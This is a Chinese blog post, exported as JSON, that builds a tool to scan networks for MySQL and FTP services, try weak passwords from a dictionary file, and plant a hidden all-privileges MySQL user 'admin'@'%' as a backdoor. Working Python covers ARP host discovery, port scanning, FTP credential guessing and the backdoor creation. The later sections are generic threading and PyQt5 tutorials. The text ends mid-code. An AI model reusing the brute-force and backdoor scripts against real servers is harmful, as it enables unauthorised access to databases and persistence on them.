{"name":"MySql","slug":"MySql","count":2,"postlist":[{"title":"互联网sql、ftp服务弱口令探测","slug":"互联网sql、ftp服务弱口令探测","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:48:15.656Z","comments":true,"path":"api/articles/互联网sql、ftp服务弱口令探测.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"互联网sql、ftp服务弱口令探测\"><a href=\"#互联网sql、ftp服务弱口令探测\" class=\"headerlink\" title=\"互联网sql、ftp服务弱口令探测\"></a>互联网sql、ftp服务弱口令探测</h1><p>12/11/2019 1:26:12 PM </p>\n<h2 id=\"设计思路\"><a href=\"#设计思路\" class=\"headerlink\" title=\"设计思路\"></a>设计思路</h2><ul>\n<li>给定网段，扫描存活主机(<code>def get_ip</code>)，将IP地址存放在 <code>iprange.txt</code> 中</li>\n<li>由于这一阶段的探测目标是指定服务，因此我们跳过端口扫描阶段，直接进行特定端口探测(<code>def port_scan</code>)</li>\n<li>对于开放目标服务的端口尝试进行弱口令登陆，弱口令密码存放在 <code>dict.txt</code> 中(‘<code>def try_login</code>‘)</li>\n<li>对于 <code>sqlserver</code> ，如果登陆成功，则创建后门服务</li>\n<li>实现图形化界面，采用 Qt desinger 技术</li>\n<li>语言选择 python 2.0+ ，并使用多线程技术</li>\n</ul>\n<h2 id=\"互联网主机探活\"><a href=\"#互联网主机探活\" class=\"headerlink\" title=\"互联网主机探活\"></a>互联网主机探活</h2><p>对于主机探活部分参考 nmap 的说明文档</p>\n<blockquote>\n<p>任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。 当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图 突破防火墙的封锁。</p>\n<p>由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN/ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0/8尤其普遍。 那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。 主机发现能够找到零星分布于IP地址海洋上的那些机器。</p>\n</blockquote>\n<p>在这里我选择使用 arp 协议进行探测，使用 arp 协议效率高，速度快，但只限于同一局域网</p>\n<h3 id=\"arp-地址解析协议\"><a href=\"#arp-地址解析协议\" class=\"headerlink\" title=\"arp 地址解析协议\"></a>arp 地址解析协议</h3><p>来自维基百科</p>\n<blockquote>\n<p>以主机A（192.168.38.10）向主机B（192.168.38.11）发送数据为例。</p>\n<p>1.当发送数据时，主机A会在自己的ARP缓存表中寻找是否有目标IP地址。如果找到就知道目标MAC地址为（00-BB-00-62-C2-02），直接把目标MAC地址写入帧里面发送就可。<br>2.如果在ARP缓存表中没有找到相对应的IP地址，主机A就会在网络上发送一个广播（ARP request），目标MAC地址是“FF.FF.FF.FF.FF.FF”，这表示向同一网段内的所有主机发出这样的询问：“192.168.38.11的MAC地址是什么？”</p>\n<p>3.网络上其他主机并不响应ARP询问，只有主机B接收到这个帧时，才向主机A做出这样的回应（ARP response）：“192.168.38.11的MAC地址是00-BB-00-62-C2-02”，此回应以单播方式。这样，主机A就知道主机B的MAC地址，它就可以向主机B发送信息。同时它还更新自己的ARP高速缓存（ARP cache），下次再向主机B发送信息时，直接从ARP缓存表里查找就可。</p>\n</blockquote>\n<h3 id=\"通过arp协议进行主机探活\"><a href=\"#通过arp协议进行主机探活\" class=\"headerlink\" title=\"通过arp协议进行主机探活\"></a>通过arp协议进行主机探活</h3><p>我们通过 scapy 来发送 arp 包，先查看 arp 的包结构</p>\n<pre><code>&gt;&gt;&gt; a = ARP()\n&gt;&gt;&gt; a.display()\n###[ ARP ]### \n  hwtype= 0x1\n  ptype= 0x800\n  hwlen= None\n  plen= None\n  op= who-has\n  hwsrc= 00:0c:29:ee:86:00\n  psrc= 192.168.43.214\n  hwdst= None\n  pdst= None\n\n&gt;&gt;&gt; a.show()\n###[ ARP ]### \n  hwtype= 0x1\n  ptype= 0x800\n  hwlen= None\n  plen= None\n  op= who-has\n  hwsrc= 00:0c:29:ee:86:00\n  psrc= 192.168.43.214\n  hwdst= None\n  pdst= None</code></pre><p>接下来用 python 实现主机探测，并将存活主机 IP 地址存放在 <code>iprange.txt</code> 中</p>\n<p><strong>ArpScanner.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\n\nfrom scapy.all import *\nimport sys,getopt\n\ndef usage():\n        print &quot;Usage: sudo ./ArpScanner.py &quot;\n\ndef main(argv):\n        try:\n                opts, args = getopt.getopt(argv, &quot;&quot;)\n        except getopt.GetoptError:\n                usage()\n                sys.exit(2)\n        with open(&quot;./iprange.txt&quot;,&quot;w&quot;) as f:\n             for ipFix in range(1,254):\n                     ip = &quot;192.168.43.&quot;+str(ipFix)\n                     arpPkt = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=ip, hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;)\n                     res = srp1(arpPkt, timeout=1, verbose=0)\n                     if res:\n                             f.write(res.psrc+&quot;\\n&quot;)\n                             print &quot;IP: &quot; + res.psrc + &quot;     MAC: &quot; + res.hwsrc\n\nif __name__ == &quot;__main__&quot;:\n        main(sys.argv[1:])</code></pre><h2 id=\"端口探测\"><a href=\"#端口探测\" class=\"headerlink\" title=\"端口探测\"></a>端口探测</h2><p>对于端口探测部分，本项目通过 socket 库实现</p>\n<p><strong>port_scan.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\nimport socket\n\n#创建流式套接字，连接远程地址\nsk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nsk.settimeout(1)\ntry:\n    sk.connect((&quot;127.0.0.1&quot;,3306))\n    print &apos;service ok&apos;\nexcept Exception:\n    print &apos;service bad&apos;\n\nsk.close()</code></pre><p>通过简单的远程连接结果来判断目标端口是否开放</p>\n<h2 id=\"尝试弱口令登陆特定服务\"><a href=\"#尝试弱口令登陆特定服务\" class=\"headerlink\" title=\"尝试弱口令登陆特定服务\"></a>尝试弱口令登陆特定服务</h2><h3 id=\"连接-mysql\"><a href=\"#连接-mysql\" class=\"headerlink\" title=\"连接 mysql\"></a>连接 mysql</h3><p>在本项目中我使用 pymysql 库来对 mysql 进行操作。 对于开放 mysql 服务的主机先尝试弱口令连接，以下是我在本地开放 mysql 服务后的测试：</p>\n<p><strong>conn_mysql.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\nimport socket\nimport pymysql\n\n# information_schema 是 Mysql 的默认数据库，我们有权限操作\n# pymysql.cursors.DictCursor 以字典方式进行连接参数管理\ntry:\n    connection = pymysql.connect(host=&apos;127.0.0.1&apos;,\n                                 user=&apos;root&apos;,\n                                 password=&apos;root&apos;,\n                                 db=&apos;information_schema&apos;,\n                                 charset=&apos;utf8mb4&apos;,\n                                cursorclass=pymysql.cursors.DictCursor)\n    # cursor()得到一个光标对象，等待输入sql语句\n    with connection.cursor() as cursor:\n        # 创建一个新记录\n        sql = &quot;select version()&quot;\n        cursor.execute(sql)\n        result = cursor.fetchone()\n    print(result)\n    connection.close()\nexcept Exception as e:\n    print &quot;登陆失败！&quot;</code></pre><p>结果成功打印了 mysql 的版本号 <code>{u&#39;version()&#39;: u&#39;5.5.53&#39;}</code> ！在我们进行数据库连接时参数都正确就登陆成功，如果错了，就会被捕捉到。</p>\n<h3 id=\"添加后门用户\"><a href=\"#添加后门用户\" class=\"headerlink\" title=\"添加后门用户\"></a>添加后门用户</h3><p>首先在本地测试查询用户命令：</p>\n<pre><code>mysql&gt; select user,host from mysql.user;\n+------+-----------+\n| user | host      |\n+------+-----------+\n| root | 127.0.0.1 |\n| root | ::1       |\n| root | localhost |</code></pre><p>创建新用户：</p>\n<pre><code>create user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;</code></pre><p>刷新权限：</p>\n<pre><code>flush privileges;</code></pre><p>尝试远程登陆：</p>\n<pre><code>mysql -u root -p -h 192.168.43.61</code></pre><p>登陆成功。但是我们没有权限访问默认数据库  <code>information_schema</code> ,还需要在创建用户时更改权限</p>\n<pre><code>mysql&gt; grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;\nQuery OK, 0 rows affected (0.17 sec)</code></pre><p>刷新系统权限表</p>\n<pre><code>mysql&gt; flush privileges;\nQuery OK, 0 rows affected (0.13 sec)</code></pre><p>在本地测试完我们还要删除测试账号</p>\n<pre><code>mysql&gt; delete from user where user=&apos;admmin&apos; and host=&apos;%&apos;;\nQuery OK, 0 rows affected (0.42 sec)\n\nmysql&gt; flush privileges;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; drop user &apos;admin&apos;@&apos;%&apos;;\nQuery OK, 0 rows affected (0.10 sec)\n\nmysql&gt; select user,host from user;\n+------+-----------+\n| user | host      |\n+------+-----------+\n| root | 127.0.0.1 |\n| root | ::1       |\n| root | localhost |\n+------+-----------+\n3 rows in set (0.00 sec)</code></pre><p>接下来尝试使用 <code>python</code> 完成上面的操作：</p>\n<p><strong>set_backdoor.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\n\nimport pymysql\n\nconnection = pymysql.connect(host=&apos;127.0.0.1&apos;,\n                                 user=&apos;root&apos;,\n                                 password=&apos;root&apos;,\n                                 db=&apos;information_schema&apos;,\n                                 charset=&apos;utf8mb4&apos;,\n                                 cursorclass=pymysql.cursors.DictCursor)\n\ntry:\n    with connection.cursor() as cursor:\n        # 创建一个新用户\n        sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;\n        cursor.execute(sql)\n        # 将后门用户权限给到最大\n        cursor.execute(&quot;grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;)\n        cursor.execute(&quot;flush privileges&quot;)\n        # 需要手动提交\n        connection.commit()\n        connection.close()\n        print &quot;创建成功！&quot;\nexcept Exception as e:\n    print e</code></pre><h3 id=\"弱口令登陆-FTP\"><a href=\"#弱口令登陆-FTP\" class=\"headerlink\" title=\"弱口令登陆 FTP\"></a>弱口令登陆 FTP</h3><p>先在本地搭建 ftp 服务进行测试。 </p>\n<p>本项目 <code>ftp</code> 模块使用 <code>ftplib</code> 实现</p>\n<p>将弱口令账户密码保存在 <code>ftp_dict.txt</code> 中，用 <code>|</code> 做分割，考虑到可以匿名访问的问题，将空账号密码也作为测试内容加入字典中，如果扫描结果输出 <code>user</code> 和 <code>pwd</code>为空，则代表该 ftp 服务允许匿名访问</p>\n<pre><code>admin|admin\nadmin|root\n |\nroot|root</code></pre><p><strong>FTP_login.py</strong></p>\n<pre><code>def try_login_ftp(ip,save_path):\n    avleable_list = &quot;&quot;\n    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问\n    try:\n        ftp = FTP()\n        ftp.connect(ip)\n        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:\n            for line in f.readlines():\n                #print line.strip()\n                user = line.strip().split(&quot;|&quot;)[0]\n                pwd = line.strip().split(&quot;|&quot;)[1]\n                ftp.login(user, pwd)  # 允许匿名访问\n                # 访问成功\n                print &quot;[+] ftp service is ok！username= &quot; + user + &quot;pwd = &quot; + pwd + &quot;\\r\\n&quot;\n                avleable_list = str(time.asctime()) + &quot; &quot; + ip + &quot; : &quot; + user + &quot; | &quot; + pwd + &quot;\\r\\n&quot;\n                save_result(save_path, avleable_list)\n                print &quot;[+] 该 ftp 文件目录为：&quot;\n                ftp.dir()\n                break\n    except Exception as e:\n        print e\n        print &quot;[-] ftp service is bad!&quot;\n        pass\n    return\n\ndef save_result(save_path,result_list):\n    s = open(save_path, &quot;a&quot;)\n    s.write(result_list)\n    s.close()\n    return</code></pre><p>这里需要注意的是 ftp 服务是否开放不能像 mysql 服务探测一样依据端口情况判断，而要根据 <code>ftp.connect()</code> 的结果判断。</p>\n<p><strong>误</strong>：上边的说法不对，其实还是可以判断的</p>\n<pre><code>try:\n    res1 = sk1.connect_ex((ip, 21))\n    print res1\n    if res1 == 0:\n        print &apos;[+] ftp service is ok! try to login...\\r\\n&apos;\n        ftp_service.try_login_ftp(url2, save_path)\n    else:\n        print res1\nexcept Exception, e:\n    print &apos;[-] ftp service login failed!&apos; + str(e) + &apos;\\r\\n&apos;\nsk1.close()</code></pre><p>通过 <code>connect.ex()</code> 返回的状态码来判断是否开放即可。</p>\n<h2 id=\"python-多线程\"><a href=\"#python-多线程\" class=\"headerlink\" title=\"python 多线程\"></a>python 多线程</h2><p>python 中使用多线程有两种方式： 函数或者用类来包装线程对象</p>\n<p>python使用 threading 模块来提供线程支持：</p>\n<ul>\n<li>threading.currentThread(): 返回当前的线程变量。</li>\n<li>threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。</li>\n<li>threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。</li>\n<li>run(): 用以表示线程活动的方法。</li>\n<li>start():启动线程活动。</li>\n<li>join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。</li>\n<li>isAlive(): 返回线程是否活动的。</li>\n<li>getName(): 返回线程名</li>\n<li>setName(): 设置线程名。</li>\n</ul>\n<h3 id=\"使用多线程的简单实例\"><a href=\"#使用多线程的简单实例\" class=\"headerlink\" title=\"使用多线程的简单实例\"></a>使用多线程的简单实例</h3><pre><code># -*-* encoding:UTF-8 -*-\n# author : 刘宇航\n# date   : 2019/12/11\n\nimport Queue\nimport threading\nimport time\n\nexitFlag = 0\n\nclass myThread (threading.Thread):\n    def __init__(self, threadID, name, counter):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.counter = counter\n    def run(self):\n        print &quot;Starting &quot; + self.name\n        process_data(self.name,self.counter,5)\n        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            if exitFlag:<br>                (threading.Thread).exit()<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p>\n<pre><code>#创建线程\nthread1 = myThread(1,&quot;Thread-1&quot;,1)\nthread2 = myThread(2,&quot;Thread-2&quot;,2)\n\n#开启线程\nthread1.start()\nthread2.start()\n\nprint &quot;Exiting Main Thread&quot;</code></pre><h3 id=\"线程同步\"><a href=\"#线程同步\" class=\"headerlink\" title=\"线程同步\"></a>线程同步</h3><p>引入 锁 的概念：每当一个线程比如 线程1 要访问共享数据时，必须先获得锁定；如果已经有别的线程比如 线程2 获得锁定了，那么就让线程1暂停，也就是同步阻塞；等到线程2访问完毕，释放锁以后，再让线程1继续。</p>\n<p>使用<code>Thread</code>对象的<code>Lock</code>和<code>Rlock</code>可以实现简单的线程同步，这两个对象都有<code>acquire</code>方法和<code>release</code>方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到<code>acquire</code>和<code>release</code>方法之间.</p>\n<p><strong>threads_test.py</strong></p>\n<pre><code># -*-* encoding:UTF-8 -*-\n# author : 刘宇航\n# date   : 2019/12/11\n\nimport Queue\nimport threading\nimport time\n\nclass myThread (threading.Thread):\n    def __init__(self, threadID, name, counter):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.counter = counter\n    def run(self):\n        print &quot;Starting &quot; + self.name\n        # 获得锁，成功后返回 True\n        # 可选的 timeout 参数不填时将会一直阻塞直到获得锁定\n        # 否则超时会返回false\n        threadLock.acquire()\n        process_data(self.name,self.counter,3)\n        # 释放锁\n        threadLock.release()\n        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p>\n<pre><code>threadLock = threading.Lock()\nthreads = []\n\n#创建线程\nthread1 = myThread(1,&quot;Thread-1&quot;,1)\nthread2 = myThread(2,&quot;Thread-2&quot;,2)\n\n#开启线程\nthread1.start()\nthread2.start()\n\n# 添加线程到线程列表\nthreads.append(thread1)\nthreads.append(thread2)\n\nfor t in threads:\n    t.join()\nprint &quot;Exiting Main Thread&quot;</code></pre><p>结果：</p>\n<pre><code>Starting Thread-1\nStarting Thread-2\nThread-1: Wed Dec 11 14:24:40 2019\nThread-1: Wed Dec 11 14:24:41 2019\nThread-1: Wed Dec 11 14:24:42 2019\nExit Thread-1\nThread-2: Wed Dec 11 14:24:44 2019\nThread-2: Wed Dec 11 14:24:46 2019\nThread-2: Wed Dec 11 14:24:48 2019\nExit Thread-2\nExiting Main Thread</code></pre><h3 id=\"线程池\"><a href=\"#线程池\" class=\"headerlink\" title=\"线程池\"></a>线程池</h3><p>使用线程池无疑是一个实现20线程数的好方法。</p>\n<p>需要注意的是使用 <code>poo.map()</code> 传递的是两个参数第一个参数是一个函数名（不带()），第二个参数是个迭代对象。</p>\n<p>一般情况第二个参数，传入一个迭代就够用了</p>\n<p><strong>threading_pool.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# -*- coding=utf-8 -*-\n\nimport socket\nfrom datetime import datetime\nfrom multiprocessing.dummy import Pool as ThreadPool\n\n\nremote_server = raw_input(&quot;Enter a remote host to scan:&quot;)\nremote_server_ip = socket.gethostbyname(remote_server)\nports = []\n\nprint &apos;-&apos; * 60\nprint &apos;Please wait, scanning remote host &apos;, remote_server_ip\nprint &apos;-&apos; * 60\n\nsocket.setdefaulttimeout(0.5)</code></pre><p>​<br>    def scan_port(port):<br>        try:<br>            s = socket.socket(2, 1)<br>            res = s.connect_ex((remote_server_ip, port))<br>            if res == 0:  # 如果端口开启 发送 hello 获取banner<br>                print ‘Port {}: OPEN’.format(port)<br>            s.close()<br>        except Exception, e:<br>            print str(e.message)</p>\n<pre><code>for i in range(1, 1025):\n    ports.append(i)\n\n# Check what time the scan started</code></pre><p>​<br>    t1 = datetime.now()</p>\n<pre><code>pool = ThreadPool(processes=20)\ntry:\n    results = pool.map(scan_port,ports)\nexcept Exception as e:\n    print e\npool.close()\npool.join()\n\nprint &apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1</code></pre><p>扫描速度还是很快的</p>\n<pre><code>Enter a remote host to scan:192.168.43.61\n------------------------------------------------------------\nPlease wait, scanning remote host  192.168.43.61\n------------------------------------------------------------\nPort 80: OPEN\nPort 135: OPEN\nPort 110: OPEN\nPort 139: OPEN\nPort 21: OPEN\nPort 25: OPEN\nPort 443: OPEN\nPort 445: OPEN\nPort 912: OPEN\nPort 902: OPEN\nMultiprocess Scanning Completed in   0:00:26.119000</code></pre><p>稍微改改放到我们的主程序中试一下扫描速度</p>\n<p>不加多线程：</p>\n<pre><code>0:00:07.019000</code></pre><p>加完之后：</p>\n<pre><code>Multiprocess Scanning Completed in   0:00:02.029000</code></pre><p>速度提升了不少！ <code>7s -&gt; 2s</code> </p>\n<h2 id=\"图形化编程\"><a href=\"#图形化编程\" class=\"headerlink\" title=\"图形化编程\"></a>图形化编程</h2><p>为了使用更方便的 PyQt5 ，把代码全都换成 python3.8 嗷。</p>\n<h3 id=\"PyQt5-入门\"><a href=\"#PyQt5-入门\" class=\"headerlink\" title=\"PyQt5-入门\"></a>PyQt5-入门</h3><p>展示一个小窗口：</p>\n<pre><code>import sys\nfrom PyQt5.QtWidgets import QApplication, QWidget\n\nif __name__ == &apos;__main__&apos;:\n\n    app = QApplication(sys.argv)\n\n    w = QWidget()\n    w.resize(250,250)\n    w.move(300, 300)\n    w.setWindowTitle(&apos;Simple&apos;)\n\n    w.show()\n\n    sys.exit(app.exec_())</code></pre><p>所有的PyQt5应用必须创建一个应用（<code>Application</code>）对象。<code>Qwidget</code> 组件是 <code>PyQt5</code> 中所有用户界面类的基础类。我们给 <code>QWidget</code> 提供了默认的构造方法。默认构造方法没有父类。没有父类的 <code>widget</code> 组件将被作为窗口使用。</p>\n<p><code>show()</code> 方法在屏幕上显示出 <code>widget</code> 。一个 <code>widget</code> 对象在这里第一次被在内存中创建，并且之后在屏幕上显示。</p>\n<p>最后，应用进入主循环。在这个地方，事件处理开始执行。主循环用于接收来自窗口触发的事件，并且转发他们到<code>widget</code> 应用上处理。如果我们调用 <code>exit()</code> 方法或主 <code>widget</code> 组件被销毁，主循环将退出。<code>sys.exit()</code>方法确保一个不留垃圾的退出。系统环境将会被通知应用是怎样被结束的。</p>\n<p><code>exec_()</code> 方法有一个下划线。因为 <code>exec</code> 是Python保留关键字。因此，用 <code>exec_()</code> 来代替。</p>\n<h3 id=\"PyQt5-信号槽机制\"><a href=\"#PyQt5-信号槽机制\" class=\"headerlink\" title=\"PyQt5-信号槽机制\"></a>PyQt5-信号槽机制</h3><p>在PyQt5中，事件处理系统由信号&amp;槽机制建立。如果我们点击了按钮，信号 <code>clicked</code> 被发送。槽可以是Qt内置的槽或Python 的一个方法调用。 <code>QCoreApplication</code> 类包含了主事件循环；它处理和转发所有事件。<code>instance()</code> 方法给我们返回一个实例化对象。注意 <code>QCoreAppli</code> 类由 <code>QApplication</code> 创建。点击信号连接到 <code>quit()</code> 方法，将结束应用。事件通信在两个对象之间进行：发送者和接受者。发送者是按钮，接受者是应用对象。</p>\n<pre><code>#!/usr/bin/python3\n# -*- coding: utf-8 -*-\n\nimport sys\nfrom PyQt5.QtWidgets import (QApplication, QWidget,\n    QPushButton, QToolTip)\nfrom PyQt5.QtGui import QFont,QIcon\nfrom PyQt5.QtCore import QCoreApplication</code></pre><p>​<br>    class Example(QWidget):</p>\n<pre><code>def __init__(self):\n    super().__init__()\n\n    self.initUI()</code></pre><p>​<br>        def initUI(self):</p>\n<pre><code>QToolTip.setFont(QFont(&apos;SanSerif&apos;,10))\n\nself.setToolTip(&apos;This is a &lt;b&gt;QWidget&lt;/b&gt; widget&apos;)\n\nbtn = QPushButton(&apos;Quit&apos;, self)\nbtn.clicked.connect(QCoreApplication.instance().quit)\nbtn.setToolTip(&apos;This is a &lt;b&gt;QPushButton&lt;/b&gt; widget&apos;)\nbtn.resize(btn.sizeHint())\nbtn.move(50,50)\n\nself.setGeometry(300,300,300,220)\nself.setWindowTitle(&apos;Icon&apos;)\nself.setWindowIcon(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;))\n\nself.show()</code></pre><p>​<br>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p>\n<pre><code>app = QApplication(sys.argv)\n\nex = Example()\nsys.exit(app.exec_())</code></pre><h3 id=\"菜单栏、状态栏\"><a href=\"#菜单栏、状态栏\" class=\"headerlink\" title=\"菜单栏、状态栏\"></a>菜单栏、状态栏</h3><pre><code>#!/usr/bin/python3\n# -*- coding: utf-8 -*-\n\nimport sys\nfrom PyQt5.QtWidgets import (QApplication, QWidget,\n    QPushButton, QToolTip, QDesktopWidget,\n                             QMainWindow, QMessageBox,\n                             QAction, qApp,\n                             QTextEdit)\nfrom PyQt5.QtGui import QFont,QIcon</code></pre><p>​<br>​<br>    class Example(QMainWindow):</p>\n<pre><code>def __init__(self):\n    super().__init__()\n\n    self.initUI()\n\ndef initUI(self):\n\n    textEdit = QTextEdit()\n    self.setCentralWidget(textEdit)</code></pre><p>​<br>            exitAction = QAction(QIcon(“C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico”)<br>                                 , ‘&amp;Exit’, self)<br>            exitAction.setShortcut(‘Ctrl+Q’)<br>            exitAction.setStatusTip(‘Exit application’)<br>            exitAction.triggered.connect(self.close)</p>\n<pre><code>self.statusBar()\n\nmenubar = self.menuBar()\nfileMenu = menubar.addMenu(&apos;&amp;File&apos;)\nfileMenu.addAction(exitAction)\n\ntoolbar = self.addToolBar(&apos;Exit&apos;)\ntoolbar.addAction(exitAction)</code></pre><p>​<br>​<br>            self.setGeometry(300,300,500, 350)<br>            self.setWindowTitle(‘Message box’)<br>            self.show()</p>\n<pre><code>def center(self):\n\n    qr = self.frameGeometry()\n    cp = QDesktopWidget().availableGeometry().center()\n    qr.moveCenter(cp)\n    self.move(qr.topLeft())</code></pre><p>​<br>​<br>        def closeEvent(self, event):</p>\n<pre><code>reply = QMessageBox.question(self, &apos;Message&apos;,\n                             &quot;Are you sure to quit?&quot;,QMessageBox.Yes |\n                             QMessageBox.No, QMessageBox.No)\n\nif reply == QMessageBox.Yes:\n    event.accept()\n\nelse:\n    event.ignore()</code></pre><p>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p>\n<pre><code>app = QApplication(sys.argv)\n\nex = Example()\nsys.exit(app.exec_())</code></pre><p>接下来让我们分开看</p>\n<pre><code>self.statusBar().showMessage(&apos;Ready&apos;)</code></pre><p>为了得到状态栏，我们调用了 <code>QtGui.QMainWindow</code> 类的 <code>statusBar()</code> 方法。第一次调用这个方法创建了一个状态栏。随后方法返回状态栏对象。然后用 <code>showMessage()</code> 方法在状态栏上显示一些信息。</p>\n<pre><code>menubar = self.menuBar()\nfileMenu = menubar.addMenu(&apos;&amp;File&apos;)\nfileMenu.addAction(exitAction)</code></pre><p><code>QAction</code> 是一个用于菜单栏、工具栏或自定义快捷键的抽象动作行为。在上面的三行中，我们创建了一个有指定图标和文本为 <code>&#39;Exit&#39;</code> 的标签。另外，还为这个动作定义了一个快捷键。第三行创建一个当我们鼠标浮于菜单项之上就会显示的一个状态提示。当我们选中特定的动作，一个触发信号会被发射。信号连接到 <code>QApplication</code> 组件的<code>quit()</code> 方法。这样就中断了应用。</p>\n<pre><code>exitAction = QAction(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;)\n                                 , &apos;&amp;Exit&apos;, self)\n            exitAction.setShortcut(&apos;Ctrl+Q&apos;)\n            exitAction.setStatusTip(&apos;Exit application&apos;)\n            exitAction.triggered.connect(self.close)</code></pre><p>我们创建了一个动作对象，和之前菜单栏中的部分代码相似。这个动作有一个标签，图标和快捷键。并且将<code>QtGui.QMainWindow的quit()</code> 方法连接到了触发信号上。创建了一个工具栏，并且在其中插入一个动作对象。</p>\n<h3 id=\"事件和信号\"><a href=\"#事件和信号\" class=\"headerlink\" title=\"事件和信号\"></a>事件和信号</h3><p>所有的GUI应用都是由事件驱动的。事件主要有用户操作产生，但是事件可能由其他条件触发，比如一个网络连接。当我们调用应用的 exec_() 方法时，应用进入了主循环，主循环用于检测事件的产生并且将事件送到用于处理的对象中去。</p>\n<p>事件模型有三个参与者：</p>\n<ul>\n<li>事件源</li>\n<li>事件对象</li>\n<li>事件目标</li>\n</ul>\n<p>事件源是状态发生改变的对象。它产生了事件。事件对象(evnet)封装了事件源中的状态变化。事件目标是想要被通知的对象。事件源对象代表了处理一个事件直到事件目标做出响应的任务。</p>\n<p>PyQt5有一个独一无二的信号和槽机制来处理事件。信号和槽用于对象之间的通信。当指定事件发生，一个事件信号会被发射。槽可以被任何Python脚本调用。当和槽连接的信号被发射时，槽会被调用。</p>\n<p>由于 Qt desinger 的设计与逻辑分离会给我们很大的帮助，所以我们使用 Qt desinger 来设计一个模板</p>\n<p><strong>sample_scan_1.py</strong></p>\n<pre><code>from PyQt5 import QtCore, QtGui, QtWidgets</code></pre><p>​<br>    class Ui_Form(object):<br>        def setupUi(self, Form):<br>            Form.setObjectName(“Form”)<br>            Form.resize(439, 345)<br>            self.verticalLayoutWidget = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget.setGeometry(QtCore.QRect(10, 50, 131, 80))<br>            self.verticalLayoutWidget.setObjectName(“verticalLayoutWidget”)<br>            self.verticalLayout = QtWidgets.QVBoxLayout(self.verticalLayoutWidget)<br>            self.verticalLayout.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout.setObjectName(“verticalLayout”)<br>            self.ftp_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.ftp_label.setObjectName(“ftp_label”)<br>            self.verticalLayout.addWidget(self.ftp_label)<br>            self.mysql_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.mysql_label.setObjectName(“mysql_label”)<br>            self.verticalLayout.addWidget(self.mysql_label)<br>            self.verticalLayoutWidget_2 = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget_2.setGeometry(QtCore.QRect(160, 50, 160, 80))<br>            self.verticalLayoutWidget_2.setObjectName(“verticalLayoutWidget_2”)<br>            self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.verticalLayoutWidget_2)<br>            self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout_2.setObjectName(“verticalLayout_2”)<br>            self.ftp_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.ftp_scan.setObjectName(“ftp_scan”)<br>            self.verticalLayout_2.addWidget(self.ftp_scan)<br>            self.mysql_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.mysql_scan.setObjectName(“mysql_scan”)<br>            self.verticalLayout_2.addWidget(self.mysql_scan)<br>            self.textBrowser = 